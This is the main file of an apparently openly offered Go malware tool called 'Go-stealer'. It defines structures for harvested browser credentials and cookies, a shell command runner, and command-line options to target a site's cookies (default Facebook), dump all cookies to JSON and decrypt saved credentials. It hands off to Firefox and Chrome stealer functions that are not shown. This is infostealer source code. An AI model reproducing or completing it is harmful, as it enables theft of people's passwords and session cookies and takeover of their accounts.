package main

import (
	"fmt"
	"os"
	"os/exec"
	"flag"
	"strings"
)
func CmdOut(command string) (string, error) {
	cmd := exec.Command("cmd", "/C", command)
	output, err := cmd.CombinedOutput()
	out := string(output)
	return out, err
}
type Credential struct{
	Host	 string `json:"host"`
	Username string `json:"username"`
	Password string `json:"password"`
}
type Cookie struct {
	Name	string `json:"name"`
	Value	string `json:"value"`
	Host	string `json:"host"`
}
type Data struct{
	Cookies 	[]Cookie 		`json:"cookies"`
	Credentials []Credential 	`json:"credentials"`
}

func main(){
	fs := flag.NewFlagSet("Go-stealer", flag.ExitOnError)
	fs.Usage = func() {
		fmt.Fprintf(os.Stderr, "Usage: go-stealer.exe [OPTIONS]\n")
		fs.PrintDefaults()
	}

	var help bool
	var dumpAll bool
	var check bool
	var t bool
	var output string
	var host string
	var browser string
	fs.BoolVar(&help, "h", false, "display this help message")

	fs.StringVar(&host, "web", "facebook", "Specific web url to look for in cookies")
	fs.StringVar(&host, "w", "facebook", "Shorthand for web option")

	fs.StringVar(&browser, "browser", "firefox", "Specific targeted browser")
	fs.StringVar(&browser, "b", "firefox", "Shorthand for browser option")

	fs.StringVar(&output, "output", "", "Log all result into a single JSON file")
	fs.StringVar(&output, "o", "", "Shorthand for -output")

	fs.BoolVar(&dumpAll, "dump-all", false, "Dump All cookies into single JSON file, --Output option is required for this.")
	fs.BoolVar(&dumpAll, "a", false, "Shorthand for -dump-all")

	fs.BoolVar(&check, "check-credentials", false, "Check local credential files and try to decrypt it.")
	fs.BoolVar(&check, "c", false, "Shorthand for check-credential option")

	fs.BoolVar(&t, "t", false, "")
	
	err := fs.Parse(os.Args[1:])
	if err != nil {
		fmt.Fprintf(os.Stderr, "%v\n", err)
		os.Exit(1)
	}
	if t{
		os.Exit(0)
	}

	if help {
		fs.Usage()
		os.Exit(0)
	}
	if strings.ToLower(browser) == "firefox"{
		FirefoxStealer(host, output, dumpAll, check)
	}else{
		ChromeStealer(host, output, dumpAll, check)
	}
}